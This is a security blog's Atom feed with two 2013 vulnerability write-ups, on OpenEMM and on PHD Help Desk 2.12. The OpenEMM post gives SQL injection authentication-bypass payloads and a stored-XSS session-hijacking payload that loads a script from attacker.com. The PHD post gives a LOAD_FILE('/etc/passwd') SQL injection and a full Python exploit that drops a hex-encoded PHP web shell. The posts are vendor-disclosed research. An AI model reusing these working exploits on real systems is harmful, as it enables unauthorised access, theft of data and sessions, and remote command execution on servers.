@@ -1,0 +1,408 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: xss | forelsec]]></title>
+  <link href="http://hatRiot.github.io/blog/categories/xss/atom.xml" rel="self"/>
+  <link href="http://hatRiot.github.io/"/>
+  <updated>2014-03-03T23:18:38-07:00</updated>
+  <id>http://hatRiot.github.io/</id>
+  <author>
+    <name><![CDATA[Bryan Alexander]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[OpenEMM-2013 SOAP SQLi/Stored XSS]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss/"/>
+    <updated>2013-07-28T23:24:15-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss</id>
+    <content type="html"><![CDATA[<p><a href="http://www.openemm.org/">OpenEMM</a> is one of the most popular enterprise-grade email marketing software currently on the market; the best part of it, too, is that it&rsquo;s free and open source.  The entire stack is java, with some random shell/Python scripts for configuration.  On inspection of the software, it appeared there were several SQL injection vulnerabilities due in part to a lack of input sanitation.  This vulnerability was privately disclosed to the vendor, and a patch will be released shortly and backported to OpenEMM 2013 and 2011.</p>
+
+<p>Paramaterized queries are not used consistently throughout the application; there are instances of paramterized queries, queries with basic sanitization, and queries without sanitization at all.  SQL queries are sanitized with the following function (SafeString.java):</p>
+
+<p>```
+  /**</p>
+
+<pre><code> * Gets the SQL string.
+ */
+public static String getSQLSafeString(String input) {
+    if (input == null) {
+        return " ";
+    } else {
+        return input.replace("'", "''");
+    }
+}
+</code></pre>
+
+<p>```</p>
+
+<p>This function inadequately sanitizes input.  The following malicious input would successfully slip through:</p>
+
+<p><code>
+\' AND UNION SELECT 1,2,3;--
+</code></p>
+
+<p>Which, when inserted into an example query <code>SELECT * FROM admin WHERE username = '$user';</code> becomes
+<code>SELECT * FROM admin WHERE username = '\'' AND UNION SELECT 1,2,3;-- ';</code></p>
+
+<p>This sanitation function is used throughout OpenEMM, and any OpenEMM server exposing WSDL, or Web Services Description Language, is vulnerable.  A default OpenEMM installation exposes a handful of useful functions that allow a remote application/user access to various tables in the database.  Each function requires authentication, which runs through the following routine (WebServiceBase.java):</p>
+
+<p>```
+protected boolean authenticateUser(MessageContext msct, String user, String pwd, int companyID) {</p>
+
+<pre><code>    boolean result=false;
+    Connection dbConn=this.getConnection(msct);
+    Statement agnStatement=null;
+    ResultSet rset=null;
+
+    try {
+        agnStatement=dbConn.createStatement();
+        rset=agnStatement.executeQuery("select a.ws_admin_id from ws_admin_tbl a where a.username='"+SafeString.getSQLSafeString(user)+"' and a.password='"+SafeString.getSQLSafeString(pwd)+"'");
+        if(rset!=null &amp;&amp; rset.next()) {
+            result=true;
+        } else {
+            result=false;
+            HttpServletRequest req=(HttpServletRequest)msct.getProperty("transport.http.servletRequest");
+            log.info(req.getRemoteAddr()+" -0-l: login failed: "+user+" "+companyID);
+        }
+</code></pre>
+
+<p>```</p>
+
+<p>As shown, the vulnerable <code>getSQLSafeString</code> method is used in an attempt to sanitize input before building and executing the query.  This leads to a very trivial authentication bypass vulnerability, allowing any malicious user access to every WSDL function (found at <code>http://yourhost.com/emm_webservices</code>).</p>
+
+<p>The following code will bypass SOAP authentication and add a new mailing list:</p>
+
+<p>```
+from SOAPpy import WSDL</p>
+
+<p>wsdl_file = &ldquo;./ws.wsdl&rdquo;
+sploit = &ldquo;\&lsquo; OR 1=1;&mdash; &rdquo;</p>
+
+<p><em>server = WSDL.Proxy(wsdl_file)
+ret = </em>server.addMailinglist(&ldquo;wsadmin&rdquo;, sploit, &ldquo;w00t&rdquo;, &ldquo;w00t&rdquo;)
+if ret > 0:</p>
+
+<pre><code>print 'success (%d)'%ret
+</code></pre>
+
+<p>```</p>
+
+<p>This requires a very basic WSDL file, which is included with an OpenEMM installation as well as the bottom of this post.  I&rsquo;ve included exploit code that exploits several of these functions:</p>
+
+<p>```
+root@jali:~/exploits# python openemm_wsdl.py -h
+usage: openemm_wsdl.py [-h] -i HOST [-s] [-m MLIST] [&mdash;dm] [&mdash;ds]</p>
+
+<p>optional arguments:
+  -h, &mdash;help  show this help message and exit
+  -i HOST     server address
+  -s          fetch all subscribers
+  -m MLIST    create new mailing list (XSS)
+  &mdash;dm        delete all mailing lists
+  &mdash;ds        delete all subscribers
+root@jali:~/exploits# python openemm_wsdl.py -i 192.168.1.83 -s
+&lt;SOAPpy.Types.structType multiRef at 30449464>: {&lsquo;x&rsquo;: [&lsquo;2013&rsquo;, &lsquo;2013-06-29 17:54:02&rsquo;, &lsquo;Last&rsquo;, &lsquo;First&rsquo;, &lsquo;2&rsquo;, &lsquo;29&rsquo;, &lsquo;0&rsquo;, &lsquo;17&rsquo;, &lsquo;2013&rsquo;, &lsquo;2013-06-29 17:54:02&rsquo;, &lsquo;&rsquo;, &lsquo;1&rsquo;, &lsquo;54&rsquo;, &lsquo;6&rsquo;, &lsquo;<a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#58;&#102;&#x69;&#x72;&#x73;&#x74;&#x2e;&#x6c;&#97;&#x73;&#x74;&#64;&#100;&#x6f;&#x6d;&#97;&#105;&#110;&#46;&#x6f;&#x72;&#x67;">&#102;&#105;&#114;&#x73;&#116;&#x2e;&#x6c;&#x61;&#115;&#116;&#x40;&#x64;&#x6f;&#109;&#97;&#x69;&#x6e;&#46;&#111;&#114;&#103;</a>&rsquo;, &lsquo;2&rsquo;, &lsquo;6&rsquo;, &lsquo;29&rsquo;, &lsquo;54&rsquo;, &lsquo;0&rsquo;, &lsquo;17&rsquo;, &lsquo;1&rsquo;]}
+&lt;SOAPpy.Types.structType multiRef at 30446728>: {&lsquo;x&rsquo;: [&lsquo;2013&rsquo;, &lsquo;2013-06-29 17:54:02&rsquo;, &lsquo;Name&rsquo;, &lsquo;No&rsquo;, &lsquo;2&rsquo;, &lsquo;29&rsquo;, &lsquo;0&rsquo;, &lsquo;17&rsquo;, &lsquo;2013&rsquo;, &lsquo;2013-06-29 17:54:02&rsquo;, &lsquo;&rsquo;, &lsquo;1&rsquo;, &lsquo;54&rsquo;, &lsquo;6&rsquo;, &lsquo;<a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#x6e;&#x6f;&#46;&#x6e;&#x61;&#109;&#x65;&#x40;&#121;&#111;&#117;&#114;&#100;&#x6f;&#x6d;&#97;&#x69;&#110;&#x2e;&#99;&#111;&#x6d;">&#x6e;&#x6f;&#46;&#x6e;&#97;&#x6d;&#x65;&#64;&#121;&#x6f;&#x75;&#x72;&#100;&#111;&#x6d;&#x61;&#x69;&#x6e;&#46;&#x63;&#x6f;&#109;</a>&rsquo;, &lsquo;2&rsquo;, &lsquo;6&rsquo;, &lsquo;29&rsquo;, &lsquo;54&rsquo;, &lsquo;0&rsquo;, &lsquo;17&rsquo;, &lsquo;2&rsquo;]}
+[!] Discovered 2 subscribers
+root@jali:~/exploits#
+```</p>
+
+<p>Our &ldquo;end goal&rdquo; for this exploit is, however, not just adding mailing lists or deleting content; we&rsquo;d like to obtain a web shell.  As OpenEMM is written in Java (struts), Java Server Pages (JSP) are invoked server-side to render client-side pages.  Theoretically, we should be able to dump a malicious JSP file into a readable/writable directory and obtain a remote shell.</p>
+
+<p>Unfortunately (fortunately for users/OpenEMM, though), the user used to connect to the MySQL database does not have FILE permissions:</p>
+
+<p>```
+mysql> select user();
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+| user()            |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+| agnitas@localhost |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+1 row in set (0.00 sec)</p>
+
+<p>mysql> show grants;
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| Grants for agnitas@localhost                                                                                                                       |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| GRANT USAGE ON <em>.</em> TO &lsquo;agnitas&rsquo;@&lsquo;localhost&rsquo; IDENTIFIED BY PASSWORD &lsquo;<em>BC428C4FAA04992D1E8CF04545DD70FA60E588C5&rsquo;                                     |
+| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON <code>openemm</code>.</em> TO &lsquo;agnitas&rsquo;@&lsquo;localhost&rsquo;     |
+| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON <code>openemm_cms</code>.* TO &lsquo;agnitas&rsquo;@&lsquo;localhost&rsquo; |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+3 rows in set (0.00 sec)</p>
+
+<p>mysql>
+```</p>
+
+<p>This is the user specified by <code>webapps/openemm/WEB-INF/classes/emm.properties</code>.  As shown, we have only basic access to the databases.  In the event that this user and permissions are modified, it is possible to upload a web shell, but in its default state, you cannot.</p>
+
+<p>From this SQL injection, then, we have authentication bypass and information disclosure.  Because this interface inserts data directly into databases, and does not go through a unified channel (i.e. for their basic sanitation methods), several fields are vulnerable to XSS, including a new mailing list&rsquo;s Description field:</p>
+
+<p><code>
+root@jali:~/exploits# python openemm_wsdl.py -i 192.168.1.83 -m w00t
+[!] Description field vulnerable to stored xss!
+[!] Enter mlist description: &lt;script&gt;alert('XSS!')&lt;/script&gt;
+[!] Saved successfully
+root@jali:~/exploits#
+</code></p>
+
+<p><img class="center <a" src="href="http://2.bp.blogspot.com/-lYlTr36HnSM/Uer_nBvALcI/AAAAAAAAAhY/vtunAxjrjfs/s640/xss.jpg">http://2.bp.blogspot.com/-lYlTr36HnSM/Uer_nBvALcI/AAAAAAAAAhY/vtunAxjrjfs/s640/xss.jpg</a>"></p>
+
+<p>With this, we can siphon off session ID&rsquo;s by simply injecting <code>&lt;script src="http://attacker.com"/&gt;</code>.  We do not need to send document.cookie because, surprise, session ID&rsquo;s are not stored as a cookie, but rather passed around through each GET/POST request.  Therefore, the Referrer header will contain the jsessionid required to hijack the session.  Our hijacked request looks as such:</p>
+
+<p>```
+root@jali:~/exploits# nc -l -p 80
+GET / HTTP/1.1
+Host: 192.168.1.147
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0
+Accept: <em>/</em>
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: <a href="http://192.168.1.83:8080/mailinglist.do;jsessionid=CBD95DD7B9B1ABF9C8922BC2DC5047E3?action=1">http://192.168.1.83:8080/mailinglist.do;jsessionid=CBD95DD7B9B1ABF9C8922BC2DC5047E3?action=1</a>
+Connection: keep-alive</p>
+
+<p>^C
+root@jali:~/exploits#
+```</p>
+
+<p>We then simply make the same request in the Referrer field and we&rsquo;ve got access to the account.</p>
+
+<p><a href="http://pastebin.com/JLh7BYYj">Exploit</a><br/>
+<a href="http://pastebin.com/GXdw3FcQ">wsdl</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[PHD Help Desk 2.12 - SQLi/XSS]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/06/02/phd-help-desk-2.12-sqli-xss/"/>
+    <updated>2013-06-02T23:55:27-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/06/02/phd-help-desk-2.12-sqli-xss</id>
+    <content type="html"><![CDATA[<p><a href="http://www.p-hd.com.ar/">PHD Help Desk</a> is a help desk application used for managing help tickets in corporate/enterprise environments.  The latest version (2.12) is vulnerable to, well, quite a few instances of SQLi and XSS.  I&rsquo;ll try and go through a couple, but there are so many it&rsquo;s sort of embarrassing, and none of them are at all complex.  The software is clocking ~200 downloads/week on Sourceforge, and no telling how many off their website, so it&rsquo;s definitely still out there somewhere.  These issues have been disclosed to the vendor and a generous amount of time to fix them has since passed.</p>
+
+<p>The first place we&rsquo;ll start is <code>login.php</code>, which tellingly holds all of the login logic.  Here&rsquo;s the relevant bit:</p>
+
+<p>```
+$operador=trim(strip_tags($_POST[operador]));
+$query=&ldquo;SELECT * FROM {$MyPHD}operador WHERE operador_id=&lsquo;$operador&rsquo;&rdquo;;
+$result=mysql_query($query) or die(mysql_error());
+$q_filas=mysql_num_rows($result);</p>
+
+<p>if($q_filas!=1)</p>
+
+<pre><code>   {$mensaje=$Oper_not_autorized;
+    require($Include.'login.inc');
+    exit();
+   }
+</code></pre>
+
+<h3>Ahora verifico la contraseña</h3>
+
+<p>$md5_contrasenia=md5($_POST[&lsquo;contrasenia&rsquo;]);</p>
+
+<p>$query=&ldquo;SELECT * FROM {$MyPHD}operador WHERE operador_id=&lsquo;$operador&rsquo; AND contrasenia=&lsquo;$md5_contrasenia&rsquo;&rdquo;;
+$result=mysql_query($query) or die (mysql_error());;
+$q_filas=mysql_num_rows($result);</p>
+
+<p>if ($q_filas!=1)</p>
+
+<pre><code>         {$mensaje=$Invalid_passwd;
+         require($Include.'login.inc');
+         exit();
+        }
+</code></pre>
+
+<p>$data=mysql_fetch_array($result);
+if ($data[&lsquo;nivel&rsquo;]&lt;1)</p>
+
+<pre><code>           {$mensaje=$Oper_not_autorized;
+            require($Include.'login.inc');
+            exit();
+           }
+</code></pre>
+
+<p>```</p>
+
+<p>This doesn&rsquo;t even really try to sanitize anything.  <a href="http://php.net/manual/en/function.strip-tags.php">strip_tags</a> is used to remove HTML and PHP tags from a string, and <a href="http://php.net/manual/en/function.trim.php">trim</a> strips whitespace; what?  It pulls out the username, checks it in the database, then pulls the password, md5&rsquo;s it, and checks that in the database.  Plenty of opportunity for SQLi, but no way to get around the login screen with a simple <code>' OR '1=1</code>, due to the final query using the md5 of the password.  We could use a malicious username and comment that out, but then the first query would fail.  So instead, we&rsquo;ll just use the username to run malicious queries.</p>
+
+<p>Submitting the following POST data to login.php will dump <code>/etc/passwd</code></p>
+
+<p><code>
+operador=' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4,5,6,7,8,9,10,11,12,13,14 INTO OUTFILE '/var/www/phd_2_12/psswd&amp;contrasenia=asdf&amp;submit=Enter&amp;captcha=
+</code></p>
+
+<p><img class="center <a" src="href="http://4.bp.blogspot.com/-Ss9O_o4PeAI/UaBAiG65xPI/AAAAAAAAAfI/CvOmVOtxEVw/s640/phd_psswd.jpg">http://4.bp.blogspot.com/-Ss9O_o4PeAI/UaBAiG65xPI/AAAAAAAAAfI/CvOmVOtxEVw/s640/phd_psswd.jpg</a>"></p>
+
+<p>With this, we can naturally obtain a web shell, as demonstrated by the exploit code I&rsquo;ve developed:</p>
+
+<p>```
+root@jali:~# python phd_sqli.py -h
+usage: phd_sqli.py [-h] [-i IP] [-p ROOTP] [-w PATH]</p>
+
+<p>optional arguments:
+  -h, &mdash;help  show this help message and exit
+  -i IP       server address
+  -p ROOTP    path to login.php (/phd_2_12)
+  -w PATH     writable web path (/var/www/phd_2_12) for shell
+root@jali:~# python phd_sqli.py -i 192.168.1.83
+[!] Dropping web shell on 192.168.1.83&hellip;
+[!] Shell dropped.  <a href="http://192.168.1.83/phd_2_12/0m05k.php?rr=ls">http://192.168.1.83/phd_2_12/0m05k.php?rr=ls</a>
+root@jali:~#
+<code>``
+As a note,</code>strip_slashes` prevents us from submitting anything that includes HTML or PHP tags in it. So I&rsquo;ve gotten around that by simply hex encoding the string:</p>
+
+<p>```</p>
+
+<h1>&lt;? php system($_GET[&ldquo;rr&rdquo;]); ?></h1>
+
+<p>data = urllib.urlencode({&lsquo;operador&rsquo;:(&lsquo;\&rsquo; UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e'</p>
+
+<pre><code>                                 ',2,3,4,5,6,7,8,9,10,11,12,13,14 INTO OUTFILE'
+                                 ' \'{0}/{1}.php'.format(options.path,shell)),
+                     'contrasenia':'pass',
+                     'submit':'Enter',
+                     'captcha':''})
+</code></pre>
+
+<p>```</p>
+
+<p>There&rsquo;s another SQLi vulnerability in <code>abro_adjunto.php</code>, which requires authentication to the application:</p>
+
+<p>```
+if (isSet($_GET[&lsquo;file&rsquo;]))</p>
+
+<pre><code>{$query="SELECT *
+         FROM {$MyPHD}sigo_ticket
+         WHERE seq_sigo_ticket_id={$_GET['file']} ";
+
+ $result=mysql_query($query) or die (mysql_error());
+
+ $row = mysql_fetch_array($result);
+
+ $tipo_adjunto = $row['tipo_adjunto'];
+ $adjunto = $row['adjunto'];
+ $nombre_adjunto = $row['nombre_adjunto'];
+
+ if(strlen($nombre_adjunto)&gt;1)
+    {header("Content-type: $tipo_adjunto");
+     header("Content-Disposition: attachment; filename=\"$nombre_adjunto\"");
+     echo $adjunto;
+    }
+ else
+    {require('head.inc');
+     echo "&lt;div class='error'&gt;INVALID CALL &lt;/div&gt;";
+    }
+}
+</code></pre>
+
+<p>```</p>
+
+<p>And the sanitization for this (and most files, really) is as follows:</p>
+
+<p>```
+if (get_magic_quotes_gpc())</p>
+
+<pre><code>{ foreach($_GET as $clave =&gt; $valor)
+  {$_GET[$clave]=stripslashes($_GET[$clave]);
+  }
+}
+</code></pre>
+
+<p>foreach($_GET as $clave => $valor)</p>
+
+<pre><code> {$_GET[$clave]=trim(htmlentities($_GET[$clave],ENT_QUOTES));
+ }
+</code></pre>
+
+<p>```</p>
+
+<p><a href="http://php.net/manual/en/function.htmlentities.php">htmlentities</a>, when specified with the ENT_QUOTES flag, will convert both single and double quotes into HTML entities, and will thus not be injectable.  However, the above query doesn&rsquo;t even use quotes, thus there is nothing to escape.</p>
+
+<p>There&rsquo;s stored XSS within all Attributes (Contact, Process, State, Type) that&rsquo;s loaded when viewing users:</p>
+
+<p><img class="center <a" src="href="http://3.bp.blogspot.com/-AswfkyCHhRo/UaBswveQO1I/AAAAAAAAAfo/vBJREQ-qHjE/s640/phd_xss.jpg">http://3.bp.blogspot.com/-AswfkyCHhRo/UaBswveQO1I/AAAAAAAAAfo/vBJREQ-qHjE/s640/phd_xss.jpg</a>"></p>
+
+<p>Here&rsquo;s the code for dropping a web shell; enjoy:</p>
+
+<p>```</p>
+
+<h1>Exploit Title: PHD Help Desk 2.12 SQLi</h1>
+
+<h1>Date: 05/24/2013</h1>
+
+<h1>Exploit Author: drone (@dronesec)</h1>
+
+<h1>Vendor Homepage: <a href="http://www.p-hd.com.ar/">http://www.p-hd.com.ar/</a></h1>
+
+<h1>Software Link: <a href="http://downloads.sourceforge.net/project/phd/phd_released/phd%202.12/phd_2_12.zip">http://downloads.sourceforge.net/project/phd/phd_released/phd%202.12/phd_2_12.zip</a></h1>
+
+<h1>Version: 2.12</h1>
+
+<h1>Tested on: Ubuntu 12.04 (apparmor disabled)</h1>
+
+<p>&ldquo;&rdquo;&ldquo; This app is so full of SQLi &amp; XSS; if you&rsquo;re looking for</p>
+
+<pre><code>practice with real web apps, this is a good place to go.
+
+You don't need auth for this.
+@dronesec
+</code></pre>
+
+<p>&ldquo;&rdquo;&ldquo;
+from argparse import ArgumentParser
+import string
+import random
+import urllib, urllib2
+import sys</p>
+
+<p>def run(options):</p>
+
+<pre><code>print '[!] Dropping web shell on %s...'%(options.ip)
+
+shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))
+
+# &lt;? php system($_GET["rr"]); ?&gt;
+data = urllib.urlencode({'operador':('\' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e'
+                                ',null,null,null,null,null,null,null,null,null,null,null,null,null INTO OUTFILE'
+                                    ' \'{0}/{1}.php'.format(options.path,shell)),
+                         'contrasenia':'pass',
+                         'submit':'Enter',
+                         'captcha':''})
+
+urllib2.urlopen('http://{0}{1}/login.php'.format(options.ip, options.rootp), data)
+print '[!] Shell dropped.  http://%s%s/%s.php?rr=ls'%(options.ip,options.rootp,shell)
+</code></pre>
+
+<p>def parse():</p>
+
+<pre><code>parser = ArgumentParser()
+parser.add_argument('-i',help='server address',action='store',dest='ip')
+parser.add_argument('-p',help='path to login.php (/phd_2_12)',action='store',
+            default='/phd_2_12', dest='rootp')
+parser.add_argument('-w',help='writable web path (/var/www/phd_2_12) for shell',
+            default='/var/www/phd_2_12/', action='store', dest='path')
+
+options = parser.parse_args()
+if not options.ip:
+    parser.print_help()
+    sys.exit(1)
+
+options.path = options.path if options.path[-1] != '/' else options.path[:-1]
+options.rootp = options.rootp if options.path[-1] != '/' else options.path[:-1]
+return options
+</code></pre>
+
+<p>if <strong>name</strong>==&ldquo;<strong>main</strong>&rdquo;:</p>
+
+<pre><code>run(parse())
+</code></pre>
+
+<p>```</p>
+
+<p><a href="http://www.exploit-db.com/exploits/25915/">Exploit</a></p>
+]]></content>
+  </entry>
+  
+</feed>
